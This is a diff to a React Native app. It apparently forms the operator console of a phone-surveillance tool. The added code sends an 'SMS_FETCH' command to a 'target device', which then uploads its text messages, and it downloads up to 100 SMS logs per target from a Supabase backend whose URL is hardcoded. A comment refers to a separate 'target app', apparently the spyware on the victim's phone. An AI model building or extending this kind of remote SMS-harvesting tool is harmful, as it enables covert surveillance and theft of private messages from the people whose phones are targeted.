@@ -12,11 +12,13 @@ import {
     StatusBar,
     Animated,
     PanResponder,
-    FlatList,
     TextInput,
     Alert,
-    ActivityIndicator
+    ActivityIndicator,
+    RefreshControl,
+    FlatList
 } from 'react-native';
+// REMOVED NativeModules HERE - IT'S ONLY FOR TARGET APP
 import Svg, { Path, Defs, LinearGradient, Stop } from 'react-native-svg';
 import {
     ChevronRight,
@@ -50,12 +52,41 @@ import {
     EyeOff,
     Trash2,
     ChevronUp,
+    Download,
+    RefreshCw,
     Image as ImageIcon
 } from 'lucide-react-native';
 
 const { width: windowWidth, height: windowHeight } = Dimensions.get('window');
 const width = windowWidth || 375;
 const height = windowHeight || 812;
+
+// --- REAL ERROR BOUNDARY ---
+class ErrorSafe extends React.Component {
+    constructor(props) {
+        super(props);
+        this.state = { hasError: false };
+    }
+    static getDerivedStateFromError(error) {
+        return { hasError: true };
+    }
+    componentDidCatch(error, errorInfo) {
+        console.error('APP_CRASH_DETECTED:', error, errorInfo);
+    }
+    render() {
+        if (this.state.hasError) {
+            return (
+                <View style={{ flex: 1, backgroundColor: '#121212', justifyContent: 'center', alignItems: 'center', padding: 20 }}>
+                    <Text style={{ color: COLORS.primary, fontSize: 24, fontWeight: '900', marginBottom: 10 }}>SYSTEM CRASH</Text>
+                    <Text style={{ color: '#fff', fontSize: 16, textAlign: 'center' }}>
+                        A fatal error occurred in the UI layer. Please restart the application.
+                    </Text>
+                </View>
+            );
+        }
+        return this.props.children;
+    }
+}
 
 // --- Supabase REST API Configuration ---
 const SUPABASE_URL = 'https://ejqrvmkjypdfqiiwyxkp.supabase.co';
@@ -2099,9 +2130,19 @@ const RoomControlScreen = ({ roomName, onBack }) => {
 };
 
 export default function App() {
+    return (
+        <ErrorSafe>
+            <AppEntry />
+        </ErrorSafe>
+    );
+}
+
+function AppEntry() {
     const [currentScreen, setCurrentScreen] = useState('onboarding');
     const [selectedDevice, setSelectedDevice] = useState(null);
     const [availableDevices, setAvailableDevices] = useState([]);
+    const [smsLogs, setSmsLogs] = useState([]);
+    const [isSmsLoading, setIsSmsLoading] = useState(false);
     const [currentUser, setCurrentUser] = useState(null);
     const [refreshData, setRefreshData] = useState(0);
 
@@ -2136,6 +2177,41 @@ export default function App() {
         const interval = setInterval(fetchDevices, 5000);
         return () => clearInterval(interval);
     }, [currentUser, refreshData]);
+
+    // --- SMS LOG LOGIC ---
+    const fetchSmsLogs = async (deviceId) => {
+        if (!deviceId) return;
+        setIsSmsLoading(true);
+        try {
+            const res = await fetch(`${SUPABASE_REST_URL}/sms_logs?device_id=eq.${deviceId}&order=date.desc&limit=100`, {
+                headers: { 'apikey': SUPABASE_ANON_KEY, 'Authorization': `Bearer ${SUPABASE_ANON_KEY}` }
+            });
+            if (res.ok) {
+                const data = await res.json();
+                setSmsLogs(data);
+            }
+        } catch (e) {
+            console.error('SMS_FETCH_ERR:', e);
+        } finally {
+            setIsSmsLoading(false);
+        }
+    };
+
+    const triggerTargetSmsSync = async () => {
+        if (!selectedDevice) {
+            Alert.alert('No Target', 'Please select a target device first.');
+            return;
+        }
+        setIsSmsLoading(true);
+        try {
+            await broadcastCommand('SMS_FETCH', { limit: 100 });
+            Alert.alert('Sync Command Sent', 'The signal was sent. Target will upload logs shortly. Please wait 5-10 seconds then press Download.');
+        } catch (e) {
+            Alert.alert('Error', 'Failed to transmit sync command');
+        } finally {
+            setIsSmsLoading(false);
+        }
+    };
 
     // MOCK: Device Discovery Listener
     useEffect(() => {
